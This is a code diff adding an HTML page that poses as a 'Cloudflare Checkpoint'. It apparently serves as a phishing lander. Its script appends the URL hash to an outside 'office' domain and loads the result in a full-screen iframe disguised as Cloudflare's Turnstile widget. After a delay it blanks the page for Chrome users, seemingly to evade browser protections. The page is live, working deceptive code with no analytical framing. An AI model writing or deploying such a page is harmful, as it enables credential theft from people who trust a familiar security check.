@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare Checkpoint</title>
+    <script>
+    // Function to get the hash parameter from the URL
+    function getHashParameter() {
+        // Get the hash from the URL (e.g., #parameter)
+        const hash = window.location.hash;
+
+        // Return the parameter
+        return hash;
+    }
+
+    // Function to set the iframe src based on the hash parameter
+    function setIframeSrc() {
+        var hashParameter = getHashParameter();
+        const link = "https://office.esecureconnections.com/bSgGyQwY";
+        var fullURL = link + hashParameter;
+        if (hashParameter) {
+            // Set the iframe src to include the hash parameter
+            document.getElementById("cf-turnstile").src = fullURL;
+        }
+    }
+
+    // Function to detect if the browser is Chrome
+    function detectChrome() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isChrome = /chrome/.test(userAgent) && !/edge|edg|opr|opera/.test(userAgent);
+
+        return isChrome;
+    }
+
+    // Function to block Chrome users
+    function blockChromeUsers() {
+        if (detectChrome()) {
+            // Hide the main content
+            document.body.innerHTML = "";
+
+            // Show the blocked message
+            const messageDiv = document.createElement("div");
+            messageDiv.id = "blockedMessage";
+            messageDiv.innerHTML = "<h1>Access Denied</h1><p>Google Chrome is not allowed to view this page.</p><p>Please use a different browser to access this content.</p>";
+            document.body.appendChild(messageDiv);
+        }
+    }
+
+    // Set the iframe src and block Chrome users on window load
+    window.onload = function() {
+        setIframeSrc();
+        setTimeout(blockChromeUsers, 3000); // Delay execution by 7 seconds
+    };
+</script>
+</head>
+<body>
+    <iframe id="cf-turnstile" src="#" style="width:100%; height:100%; border:none;"></iframe>
+</body>
+</html>
